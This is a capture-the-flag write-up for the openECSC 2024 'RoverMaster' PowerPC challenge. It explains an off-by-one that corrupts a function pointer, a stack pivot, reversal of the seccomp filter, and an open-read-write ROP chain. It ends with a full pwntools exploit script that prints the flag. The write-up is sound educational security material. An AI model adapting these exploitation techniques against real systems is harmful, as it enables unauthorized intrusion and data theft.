# openECSC 2024 - Round 1

## [pwn] 🪐RoverMaster🪐 (10 solves)

🪐 I'm giving you the keys for the art of mastering rovers... 🪐

You can download the challenge files [here](https://cloud.cybersecnatlab.it/s/Po7sJdYCDdtwLjy).

`nc rovermaster.challs.open.ecsc2024.it 38007`

Authors: Giulia Martino <@Giulia>, Vincenzo Bonforte <@Bonfee>

## Overview

This is a powerpc pwn challenge. The challenge is running inside a docker container, inside a `qemu-system-ppc64le` virtual machine (yes, the setup is a bit complicated but qemu-user was too much limited!).

The goal is to pwn the `main` binary, which lets the user interact and manage with some rovers that are flying around in our galaxy 🪐.  

The binary is statically linked and not PIE.

Rovers are implemented as structs:
```c
struct __attribute__((packed)) rover {
    uint8_t weight;
    uint8_t x, y, z;
    uint8_t temperature;
    uint8_t battery;
    char planet[ROVER_PLANET_LEN];
    char name[ROVER_NAME_LEN];
    void (*action)(void);
};
```
and the binary already contains a list of 15 predefined rovers.  

First of all, the challenge executes a `init` function which installs a seccomp filter. The challenge then starts asking for a joke to the user, and then presents a simple menu. The user can select a rover from the rovers list, send a command to the currently selected rover, or tell the rover to execute the selected command. The available commands for a rover are:
- get planet: prints rover's planet
- set planet: sets rover's planet
- get name: prints rover's name
- set name: sets rover's name
- move rover: changes rover's coordinates
- full info: prints full information

## Vulnerability
The function 'read_exactly` reads one byte more than it should, leading to a one-byte buffer overflow.
```c
int read_exactly(int fd, void *buf, size_t size)
{
    size_t done = 0;        
    while (done <= size) {          // This comparison should be strictly *lower than*
        ssize_t count = read(fd, (char *)buf + done, 1);
        if (count <= 0)
            return -1;
        done += count;
    }
    return 0;
}
```

This function is used in three different ways:
1. to read the joke at the start of `main`
2. to read the planet when calling `set_planet`
3. to read the name when calling `set_name`

The first two cases are not really interesting: the first one overflows over some padding bytes in main's stack, the second one overflows into a rover's name. The third one though lets the user overwrite the LSB of a rover's action function pointer. By overwriting the LSB to make the function pointer point to a juicy address, we can get to control flow hijacking the next time we execute the command on this rover.

## Exploitation
When the off-by-one is triggered inside the `set_name` function, the action function pointer is set to `set_name` itself. This means that the only places we can make it point to are the addresses `0x10000eXX` where `XX` is arbitrary.  

Right before the start of the `set_name` function there's a very interesing gadget, which is the epilogue of the `set_planet` function:
```
0x10000e64 <+204>:   addi    r1,r31,160
0x10000e68 <+208>:   ld      r0,16(r1)
0x10000e6c <+212>:   mtlr    r0
0x10000e70 <+216>:   ld      r31,-8(r1)
0x10000e74 <+220>:   blr
```

If we use the off-by-one to write `0x64` on the LSB of the function pointer, we can execute this gadget instead of the intended action. This gadget moves `r1` (the stack pointer), shifting our stack down and pivoting it to `main`'s stack frame, where a controlled buffer used for the joke string is stored. The gadget then loads a value from the stack into `r0`, moves the value from `r0` to `lr` (the link register) and loads another value from the stack into `r31` (the frame pointer). Since we control the stack, we can set them to arbitrary values. The gadget finally executes `blr` (branch to link register) which continues the execution from the address stored into `lr`. Therefore, controlling `lr` means we can control the execution; controlling `r31` together with the correct gadgets means we can control where the stack will be positioned.  

The strategy is: write a ROP chain somewhere inside the binary and then pivot the stack to it. In order to build the ROP chain, we need gadgets. Gadgets can be both found by using `ROPGadget` or by brutally going for `powerpc64le-linux-gnu-objdump -d` and then grep for interesting instructions (objdump can be installed through `binutils-powerpc64le-linux-gnu` package, available in most distros). Some notes about the binary:

1. it is not PIE, which means we can use any gadget inside it without needing any leak
2. it is statically linked: no libc (which means no system, ...) but lots of gadgets in the binary itself
3. it installs a seccomp filter, which needs to be reversed in order to understand which syscalls are allowed

Unfortunately, `seccomp-tools` doesn't support PowerPc, but reversing the filter by hand is quite straightforward with a bit of intuition. We can export the raw bytes for the filter (for example using Ghidra) and analyze the patterns in them to match bytes with syscall numbers; you can find the full list of PowerPC64 syscall numbers in many online databases (e.g. [this website](https://syscalls.mebeim.net/?table=powerpc/64/ppc64/latest)).

```
20 00  00 00  04 00  00 00
15 00  01 00  15 00  00 c0
06 00  00 00  00 00  00 00
20 00  00 00  00 00  00 00
15 00  00 01 [01 00] 00 00     # 0x0001        exit
06 00  00 00  00 00  ff 7f
15 00  00 01 [ea 00] 00 00     # 0x00ea        exit_group
06 00  00 00  00 00  ff 7f
15 00  00 01 [f8 00] 00 00     # 0x00f8        clock_nanosleep
06 00  00 00  00 00  ff 7f
15 00  00 01 [1e 01] 00 00     # 0x011e        openat
06 00  00 00  00 00  ff 7f
15 00  00 01 [03 00] 00 00     # 0x0003        read
06 00  00 00  00 00  ff 7f
15 00  00 01 [04 00] 00 00     # 0x0004        write
06 00  00 00  00 00  ff 7f
06 00  00 00  00 00  00 00
```

We can easily assume that this is an allow list, even without reversing the rest of the seccomp filter (for example, the challenge itself executes the exit syscall, so this must be the list of allowed syscalls).  

It is clear at this point that we need to build an open-read-write ROP chain to read the flag from the filesystem and print it to stdout. There's many possible ways to achieve that, so any ROP chain can be considered an intended solution. We will just go through one of them :)

If you're used to ROPping on x86(_64) then you'll probably feel that it's a bit weirder than usual here. There aren't many PowerPC pwn challenges/resources out there online, so you will have to figure out what the different instructions do and how control flow is handled (e.g. which registers are involved in it) and come up with your own strategy.  

There is no `ret` instruction here. Instead, the usual flow for returning is: putting the return address into the aforementioned special register, `lr`, and then jumping to that register using the `blr` instruction (branch to link register), which is exactly what was happening in the gadget mentioned before. Another instruction that can be used for control-flow while ROPping is `bctrl`, which branches to `ctr`, the count register, usually used for loops.

This was our first time ROPping in PowerPC, so we were just exploring the disassembled binary to have a look around. One of the first gadgets we stumbled upon was this huge cool one, part of `_Unwind_Resume` function.

```
    100b859c:	78 fb ea 7f 	mr      r10,r31
    100b85a0:	f9 08 a1 f6 	lxv     vs53,2288(r1)
    100b85a4:	09 09 c1 f6 	lxv     vs54,2304(r1)
    100b85a8:	19 09 e1 f6 	lxv     vs55,2320(r1)
    100b85ac:	29 09 01 f7 	lxv     vs56,2336(r1)
    100b85b0:	39 09 21 f7 	lxv     vs57,2352(r1)
    100b85b4:	49 09 41 f7 	lxv     vs58,2368(r1)
    100b85b8:	20 01 12 7c 	mtocrf  32,r0
    100b85bc:	b0 08 01 80 	lwz     r0,2224(r1)
    100b85c0:	59 09 61 f7 	lxv     vs59,2384(r1)
    100b85c4:	d8 0a 41 e8 	ld      r2,2776(r1)
    100b85c8:	69 09 81 f7 	lxv     vs60,2400(r1)
    100b85cc:	79 09 a1 f7 	lxv     vs61,2416(r1)
    100b85d0:	89 09 c1 f7 	lxv     vs62,2432(r1)
    100b85d4:	99 09 e1 f7 	lxv     vs63,2448(r1)
    100b85d8:	c0 08 61 e8 	ld      r3,2240(r1)
    100b85dc:	c8 08 81 e8 	ld      r4,2248(r1)
    100b85e0:	d0 08 a1 e8 	ld      r5,2256(r1)
    100b85e4:	d8 08 c1 e8 	ld      r6,2264(r1)
    100b85e8:	20 01 11 7c 	mtocrf  16,r0
    100b85ec:	b8 08 01 80 	lwz     r0,2232(r1)
    100b85f0:	a0 09 c1 e9 	ld      r14,2464(r1)
    100b85f4:	a8 09 e1 e9 	ld      r15,2472(r1)
    100b85f8:	b0 09 01 ea 	ld      r16,2480(r1)
    100b85fc:	b8 09 21 ea 	ld      r17,2488(r1)
    100b8600:	c0 09 41 ea 	ld      r18,2496(r1)
    100b8604:	c8 09 61 ea 	ld      r19,2504(r1)
    100b8608:	d0 09 81 ea 	ld      r20,2512(r1)
    100b860c:	d8 09 a1 ea 	ld      r21,2520(r1)
    100b8610:	e0 09 c1 ea 	ld      r22,2528(r1)
    100b8614:	e8 09 e1 ea 	ld      r23,2536(r1)
    100b8618:	20 81 10 7c 	mtocrf  8,r0
    100b861c:	d0 0a 01 e8 	ld      r0,2768(r1)
    100b8620:	f0 09 01 eb 	ld      r24,2544(r1)
    100b8624:	f8 09 21 eb 	ld      r25,2552(r1)
    100b8628:	00 0a 41 eb 	ld      r26,2560(r1)
    100b862c:	08 0a 61 eb 	ld      r27,2568(r1)
    100b8630:	10 0a 81 eb 	ld      r28,2576(r1)
    100b8634:	18 0a a1 eb 	ld      r29,2584(r1)
    100b8638:	20 0a c1 eb 	ld      r30,2592(r1)
    100b863c:	28 0a e1 eb 	ld      r31,2600(r1)
    100b8640:	30 0a c1 c9 	lfd     f14,2608(r1)
    100b8644:	38 0a e1 c9 	lfd     f15,2616(r1)
    100b8648:	40 0a 01 ca 	lfd     f16,2624(r1)
    100b864c:	48 0a 21 ca 	lfd     f17,2632(r1)
    100b8650:	50 0a 41 ca 	lfd     f18,2640(r1)
    100b8654:	58 0a 61 ca 	lfd     f19,2648(r1)
    100b8658:	60 0a 81 ca 	lfd     f20,2656(r1)
    100b865c:	68 0a a1 ca 	lfd     f21,2664(r1)
    100b8660:	70 0a c1 ca 	lfd     f22,2672(r1)
    100b8664:	78 0a e1 ca 	lfd     f23,2680(r1)
    100b8668:	80 0a 01 cb 	lfd     f24,2688(r1)
    100b866c:	88 0a 21 cb 	lfd     f25,2696(r1)
    100b8670:	90 0a 41 cb 	lfd     f26,2704(r1)
    100b8674:	98 0a 61 cb 	lfd     f27,2712(r1)
    100b8678:	a0 0a 81 cb 	lfd     f28,2720(r1)
    100b867c:	a8 0a a1 cb 	lfd     f29,2728(r1)
    100b8680:	b0 0a c1 cb 	lfd     f30,2736(r1)
    100b8684:	b8 0a e1 cb 	lfd     f31,2744(r1)
    100b8688:	c0 0a 21 38 	addi    r1,r1,2752
    100b868c:	a6 03 08 7c 	mtlr    r0
    100b8690:	14 52 21 7c 	add     r1,r1,r10
    100b8694:	20 00 80 4e 	blr
```

We settled for this one as it gives you control over many registers. In short, it loads a lot of registers from the stack, including `r0` (which is afterwards moved into `lr`) and `r3`, `r4`, `r5` which are the registers used for parameters. This can be used to set arbitrary arguments and call arbitrary functions; we can use it 3 times in our ROPchain: to prepare args for open + execute open; to prepare args for read + execute read; to prepare args for write + execute write. Since the gadget is loading the values from the stack at a large offset, we decided to first search for a gadget that could let us read an arbitrary amount of data to use as our fake stack and then pivot there.    

This is where the function `cmd_set_name` comes in handy: its last instructions act as a perfect gadget for achieving what we need.
```
0x10000f2c <+168>:   ld      r9,96(r31)
0x10000f30 <+172>:   addi    r9,r9,262
0x10000f34 <+176>:   lwz     r10,104(r31)
0x10000f38 <+180>:   clrldi  r10,r10,32
0x10000f3c <+184>:   mr      r5,r10
0x10000f40 <+188>:   mr      r4,r9
0x10000f44 <+192>:   li      r3,0
0x10000f48 <+196>:   bl      0x10000be0 <read_exactly+8>
0x10000f4c <+200>:   nop
0x10000f50 <+204>:   addi    r1,r31,128
0x10000f54 <+208>:   ld      r0,16(r1)
0x10000f58 <+212>:   mtlr    r0
0x10000f5c <+216>:   ld      r31,-8(r1)
0x10000f60 <+220>:   blr
```

In essence, it reads both `r9` and `r10` from somewhere around `r31` (which we controlled with the previous gadget), performs some operation on them and then moves their values respectively to `r4` and `r5`. Then `r3` is set to 0. By analyzing the instructions better we can get to the conclusion that the final values are:

```
r3 = 0
r4 = 96(r31) + 262
r5 = (104(r31) & 0xffffffff) + 1
```

It then calls `read_exaclty` followed by an epilogue which is very similar to the stack pivoting gadget we used before. As such, we can now pivot our stack again to a controlled + arbitrary length stack. Since the function used to read the big ROPchain into our fake stack is `read_exactly`, we need to know the exact length of the chain itself when executing this gadget. Therefore, if you're looking at the exploit, just know this is the reason why the big ROPchain payload is defined before triggering the stack pivot.

Here after, it's just a matter of executing our cool gadget 3 times and calling open-read-write. As said before, the gadget loads values from a large offset into the stack, indicating that it expects a huge stack frame. Considering we want to call it 3 times, the needed space would be too much.  

Therefore, to optimize the space needed, we will be overlapping both the stack frames for this gadget and the ones for open-read-write with a slightly different offset each time. This will result in our big ROPchain being structured this way:

```
     -----------------------------------------
 [1]  read big rop chain -> cool gadget           cool gadget here loads value from [5]
     -----------------------------------------
 [2]  open flag -> cool gadget                    cool gadget here loads value from [6]
     -----------------------------------------
 [3]  read flag -> cool gadget                    cool gadget here loads value from [7]
     -----------------------------------------
 [4]  write flag -> exit
     -----------------------------------------
      padding
     -----------------------------------------
 [5]  params for open("flag\x00")
     -----------------------------------------
 [6]  params for read(3, rovers array, 0x100)
     -----------------------------------------
 [7]  params for write(1, rovers array, 0x100)
     -----------------------------------------
```

All we have to do now is sending all the payloads and trigger the vulnerability. And a flag pops up :)


## Exploit

```python
#!/usr/bin/env python3

import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.endianness = 'little'
context.bits = 64

if args.NOLOG:
    logging.disable()

exe = ELF('./main')

gdbscript = '''
'''
gdbscript = "\t-ex\t".join(gdbscript.splitlines()).split("\t")[1:]

def start():
    HOST = os.environ.get('HOST', 'localhost')
    PORT = os.environ.get('PORT', 5555)
    p = remote(HOST, PORT)
    if args.ATTACH:
        run_in_new_terminal(["gdb-multiarch", "main", "-ex", f"target remote {HOST}:1234"] + gdbscript)
    return p

io = start()

# ======================================================= stack pivot 1 =======================================================
# this is placed in main's stack frame. the function pointer corruption
# will pivot the stack to this frame here.
# this frame calls the read gadget, so that we can read a big rop chain into g_rovers

READ_GADGET = exe.symbols.cmd_set_name + 168
G_ROVERS = exe.symbols.g_rovers
payload = p64(G_ROVERS)             # r31
payload += b"B" * 0x8               # nowhere
payload += b"C" * 0x8               # nowhere
payload += p64(READ_GADGET)         # lr        (where i will jump to)

io.sendlineafter(b"Joke size: ", str(len(payload)).encode())
io.sendlineafter(b"Joke: ", payload)

io.sendlineafter(b"Option:", str(2).encode())                       # Set command
io.sendlineafter(b"Choose the action:", str(1).encode())            # action -> set planet
io.sendlineafter(b"Option:", str(3).encode())                       # Execute command
io.sendlineafter(b"Send new planet size: ", str(0x100).encode())

# ======================================================= BIG ROP CHAIN =======================================================     # we need to know the length of this ropchain to call read_exactly

PARAMS_SHIFT = 0x200
STACK_PADDING = 0x30
STACK_SHIFT = (-0xac0 + STACK_PADDING + PARAMS_SHIFT) % 2**64 

# ===================== 1 ===================== - read -> coolg
LR_OFFSET = 0x90
COOL_GADGET =  exe.sym._Unwind_Resume + 380
stack1 = b"flag\x00"
stack1 += b"D" * (LR_OFFSET - len(stack1) - 0x8 * 3)
stack1 += p64(STACK_SHIFT)               # r31              # this is the offset i can use to move the stack at the end of COOL_GAGDET
stack1 += p64(0x0)                                          # <---- when i jump to COOL_GADGET the stack is here
stack1 += p64(0x0)
stack1 += p64(COOL_GADGET)               # lr

# ===================== 2 ===================== - open -> coolg

R31_OFFSET = 0x10 + PARAMS_SHIFT
stack2 = b""
stack2 += b"E" * R31_OFFSET
stack2 += p64(STACK_SHIFT)              # r31
stack2 += p64(0x0)
stack2 += p64(0x0)
stack2 += p64(COOL_GADGET)              # lr

# ===================== 3 ===================== - read -> coolg

R31_OFFSET = 0x10 + PARAMS_SHIFT
stack3 = b""
stack3 += b"F" * R31_OFFSET
stack3 += p64(STACK_SHIFT)              # r31
stack3 += p64(0x0)
stack3 += p64(0x0)
stack3 += p64(COOL_GADGET)              # lr

# ===================== 4 ===================== - write -> exit

# we don't need anything here cause we don't care what the program does after write
EXIT = exe.sym.exit
R31_OFFSET = 0x10 + PARAMS_SHIFT
stack4 = b""
stack4 += b"F" * R31_OFFSET
stack4 += p64(STACK_SHIFT)              # r31
stack4 += p64(0x0)
stack4 += p64(0x0)
stack4 += p64(EXIT)                     # lr

# ============== params for open =============

FRAME2_R3_OFFSET = 0x8a8
FRAME2_R0_OFFSET = 0x1f8
OPEN =  exe.sym.open64 + 20

params = b"X" * (FRAME2_R3_OFFSET - len(stack2) - len(stack3) - len(stack4))
params += p64(G_ROVERS)                  # r3
params += p64(0x0)                       # r4
params += p64(0x1a4)                     # r5
params += b"X" * FRAME2_R0_OFFSET
params += p64(OPEN)                      # r0 (next call)

# ============== params for read =============

FRAME4_R3_OFFSET = 0x18
FRAME4_R0_OFFSET = 0x1f8
READ = exe.sym.read + 20
FD = int(args.FD if args.FD else 3)

params += b"Y" * FRAME4_R3_OFFSET
params += p64(FD)                        # r3
params += p64(G_ROVERS)                  # r4            -> the flag will be read here
params += p64(0x100)                     # r5            -> read 0x100 bytes
params += b"X" * FRAME4_R0_OFFSET
params += p64(READ)                      # r0 (next call)

# ============== params for write =============

FRAME6_R3_OFFSET = 0x18
FRAME6_R0_OFFSET = 0x1f8
WRITE =  exe.sym.write + 20

params += b"Z" * FRAME6_R3_OFFSET
params += p64(1)                         # r3
params += p64(G_ROVERS)                  # r4            -> the flag will be read here
params += p64(0x100)                     # r5            -> write 0x100 bytes
params += b"Z" * FRAME6_R0_OFFSET
params += p64(WRITE)                     # r0 (next call)

stack = stack1 + stack2 + stack3 + stack4 + params

# ======================================================== read gadget ========================================================
ROP_READ_LEN = len(stack)
payload = b"A" * 0x5a                                               # padding
payload += p64(G_ROVERS - 0x106)                                    # this will be r9 + 0x106
payload += p64((0x61616161 << 32) | (ROP_READ_LEN - 1))             # the lower half will be set to r10. then r10++
payload += b"C" * (0x100 - len(payload) + 1)
io.sendafter(b"New planet: ", payload)

# ======================================================== trigger bug ========================================================
io.sendlineafter(b"Option:", str(2).encode())
io.sendlineafter(b"Choose the action:", str(3).encode())

io.sendlineafter(b"Option:", str(3).encode())                       # Execute command
io.sendlineafter(b"Send new name size: ", str(0x100).encode())
OFF_BY_ONE = (exe.sym.cmd_set_planet + 204) & 0xff                  # this needs to be the LSB of the instr:     addi    r1,r31,160.
io.sendlineafter(b"New name: ", b"D"*0x100 + p8(OFF_BY_ONE))               
io.sendlineafter(b"Option:", str(3).encode())                       # Execute command

# Here we just triggered the controlled length read inside g_rovers. We send the new stack here.
io.send(stack)

if args.ATTACH:
    io.interactive()
else:

    res = io.clean(0.5)

    if b"openECSC{" in res:
        flag = b"openECSC{" + res.split(b"openECSC{")[1].split(b"}")[0] + b"}"
        print(flag.decode())
    else:
        print("flag not found :(")

io.close()
exit()


```